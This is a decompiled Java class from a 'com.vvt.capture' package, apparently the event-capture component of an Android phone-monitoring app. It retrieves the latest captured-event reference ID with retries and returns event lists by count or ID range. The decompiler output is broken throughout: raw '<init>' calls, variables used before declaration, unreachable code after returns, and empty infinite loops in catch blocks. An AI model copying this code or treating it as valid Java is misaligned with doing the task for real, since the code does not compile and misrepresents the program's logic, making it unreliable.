package com.vvt.capture.e.c.a.a.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = -1;
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    long l3;
    try
    {
      str = com.vvt.capture.e.c.a.b.b();
      if (str == null) {
        break label197;
      }
      long l2 = com.vvt.capture.e.c.a.b.b(str);
      bool1 = false;
      Object localObject = null;
      l3 = l2;
      j = 0;
    }
    catch (Exception localException1)
    {
      try
      {
        String str;
        boolean bool3;
        int k;
        SystemClock.sleep(l4);
        long l4 = com.vvt.capture.e.c.a.b.b(str);
        int i = j + 1;
        j = i;
        l3 = l4;
      }
      catch (Exception localException2)
      {
        int j;
        for (;;) {}
      }
      localException1 = localException1;
      l3 = l1;
    }
    bool3 = l3 < l1;
    if (!bool3)
    {
      k = 10;
      if (j < k)
      {
        l4 = 6000L;
        j = c;
        if (j == 0) {}
      }
    }
    for (;;)
    {
      boolean bool4 = l3 < l1;
      boolean bool2;
      if (bool4)
      {
        l1 = -2;
        bool4 = l3 < l1;
        if (bool4) {}
      }
      else
      {
        bool2 = b;
        if (bool2) {}
        l3 = this.d;
      }
      for (;;)
      {
        Long localLong = Long.valueOf(l3);
        localFxSimpleEventReference.setReference(localLong);
        bool2 = a;
        if (bool2) {}
        return localFxSimpleEventReference;
        this.d = l3;
      }
      label197:
      l3 = l1;
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    try
    {
      ArrayList localArrayList2 = com.vvt.capture.e.c.a.b.a(paramInt);
      localArrayList1.addAll(localArrayList2);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return localArrayList1;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = com.vvt.capture.e.c.a.b.a(l1, l2);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
  
  public void b()
  {
    this.d = -1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/MyUncaughtExceptionHandler/a/a/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */